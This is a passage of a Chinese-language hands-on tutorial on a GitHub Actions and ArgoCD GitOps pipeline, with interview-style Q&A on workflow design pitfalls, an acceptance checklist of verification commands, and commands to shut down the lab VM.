**Q10. `if: always()` 是干什么的？**
> 每个 job 默认隐含 `if: success()`，上游挂了就跳过。通知类的 job 必须写 `if: always()`，
> 否则**流水线失败的时候你恰恰收不到失败通知**——这是最经典的错误。
> 我的 report job 用 `needs.*.result` 这个对象过滤语法把所有上游 job 的结果拼成数组，
> 再用 `contains()` 判断有没有 failure。GitHub 表达式没有三元运算符，
> 用 `A && B || C` 这个惯用法代替。

**Q11. 镜像 tag 你怎么设计的？为什么不用 latest？**
> `<run_number>-<git短7位sha>`，比如 `3-b989bff`。run_number 单调递增，
> 一眼看出哪次在前；短 sha 直接反查 commit。
> `latest` 三个问题：不可追溯（不知道是哪次构建）、不可回滚（没有上一个版本的地址）、
> 还会让 K8s 的滚动更新行为变得诡异（同一个 tag，`kubectl` 可能认为 spec 没变而不触发滚动）。
> 制品 tag 必须是不可变且可追溯的。

**Q12. 你遇到过最难查的问题是什么？**
> 「job 是绿的，但什么都没发生。」我的 composite action 用 yq 的
> `select(.name == ...)` 去 GitOps 仓库里定位要改的镜像条目，
> 但配置文件里那个 name 还是模板占位符 `OWNER`，没换成真实用户名。
> select 匹配到空集合，赋值作用在空集合上——**不报错，什么都没改**，
> 接着 `git diff --cached --quiet` 为真，走了「无变化跳过 commit」的分支，job 绿。
> 下游 verify 一直断言版本对不上，但上游全绿，看不出来问题在哪。
> 从这之后我的规律是：**凡是「筛选再修改」的逻辑，都要先单独验证筛选条件命中了东西**，
> 更好的是让它在匹配不到时主动失败，而不是静默跳过。

**Q13. 你的流水线怎么等部署生效？**
> 一开始写的是 `sleep 15` 然后 curl 一次，结果必然失败——
> **ArgoCD 默认的 reconciliation 间隔是 180 秒**，15 秒它还没去拉 Git。
> 改成带超时的轮询：每 10 秒探一次，dev 最多等 300 秒、prod 420 秒，
> 滚动更新期间连不上视为正常继续等，超时才失败并打印三步排查顺序。
> job 的 `timeout-minutes` 也要同步调大于轮询窗口，否则轮询没跑完 job 先被杀。
> 一句话：**异步系统之间不能用 sleep 对齐，要轮询目标状态。**

**Q14. `on:` 有哪些常用触发器？**
> `push`（可以按 `branches`/`tags`/`paths` 过滤）、`pull_request`、
> `workflow_dispatch`（手动，可以带 inputs 表单）、`schedule`（cron，**注意是 UTC**）、
> `release`、`workflow_call`（被别的 workflow 调用，reusable workflow 靠它）。
> 我用了 push + workflow_dispatch，dispatch 带一个 `skip_prod` 输入用来自测。
> 有个坑：`github.event.inputs.*` **只在 dispatch 触发时有值**，push 触发时是空字符串，
> 所以条件要写 `!= 'true'` 而不是 `== 'false'`，否则 push 触发时那个 job 永远不跑。

**Q15. 如果让你改进这条流水线，你会做什么？**
> 三件事。第一，**action 全部钉 commit SHA + 上 Dependabot**，现在还是大版本浮动。
> 第二，**verify 改成查 ArgoCD Application 的 sync/health 状态**，而不是靠 curl 应用接口
> 反推——现在的做法在应用本身有 bug 时会把「部署成功但应用崩了」和「没部署上」混在一起。
> 第三，**自建 runner 改成 ephemeral + Actions Runner Controller**，
> 现在 runner 是长期在线的、`_work` 目录跨 job 复用，不是干净环境。
> 再往后就是往云上部署时用 **OIDC** 换临时凭证，彻底不存长期密钥。

---

# Part 8 · 验收清单

做完之后逐条打勾，**每条都要看到实际输出**，不能靠"应该是好的"。

## 环境

- [ ] `multipass list` → `gitops-labs` Running，有 IPv4
- [ ] `kubectl get nodes` → `k3d-gitops-server-0  Ready`
- [ ] `sudo docker port k3d-gitops-serverlb` → 有 `30081` 和 `30082`
- [ ] `kubectl -n argocd get applications` → `dasher-root` Synced，`dasher-dev` Synced/Healthy
- [ ] runner online：`gh api repos/<O>/<R>/actions/runners --jq '.runners[]|{name,status}'`

## 仓库配置

- [ ] `gh secret list -R <O>/<R>` → `GITOPS_REPO` + `GITOPS_PAT` **两个都在**
- [ ] `gh api repos/<O>/<R>/environments --jq '.environments[].name'` → `dev` / `prod`
- [ ] PAT 边界自证：拿 PAT 查非授权仓库返回 **404**
- [ ] GitOps 仓库三处 `image` / `images[].name` 都是**真实 owner**，不是 `OWNER`

## 流水线

- [ ] `test` 两条腿（node 18/20）都绿，node20 有 artifact
- [ ] Packages 里有 `dasher-svc`，manifest 里 **amd64 和 arm64 都有**
- [ ] `dasher-gitops` 有 `github-actions[bot]` 的 bump commit
- [ ] `verify-dev` 的 "Set up job" 里 Runner name 是**你自建 runner 的名字**
- [ ] `verify-dev` 日志里能看到轮询过程，最后 `✅ dasher-dev 已是本次构建版本`
- [ ] `report` job 在**流水线失败时也照样跑**（`if: always()` 生效）

## 能讲出来（这才是目的）

- [ ] 不看文档，能在白板上写出 `test` → `build-push` → `bump` → `verify` 的依赖图
- [ ] 能说清 `GITHUB_TOKEN` 为什么跨不了仓库
- [ ] 能说清为什么 CI 不该有 kubectl 权限
- [ ] 能复述 Part 6 里**至少三个坑**的现象、定位过程和根因

---

## 收工

```bash
# 停 runner，保留集群
multipass exec gitops-labs -- bash -lc 'cd ~/actions-runner && sudo ./svc.sh stop'
# 暂停虚机（保留全部数据，下次 multipass start 继续）
multipass stop gitops-labs
# 彻底清理
multipass delete gitops-labs --purge
```
